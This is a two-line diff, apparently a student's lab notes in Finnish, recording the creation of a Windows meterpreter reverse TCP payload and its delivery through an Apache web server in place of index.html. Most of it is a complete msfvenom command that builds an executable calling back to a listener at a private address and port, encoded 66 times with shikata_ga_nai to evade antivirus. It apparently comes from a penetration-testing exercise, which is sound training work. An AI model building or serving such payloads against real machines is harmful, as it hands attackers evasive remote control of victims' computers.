@@ -1,0 +1,2 @@
+Tehtiin komento jolla luotiin reverce tcp johon lisättiin encoodaus. index.html korvattiin apache2 geiboi.exe:ssä
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.28.172.33 LPORT=42069 -e x86/shikata_ga_nai -i 66 -f exe > geiboi.exe
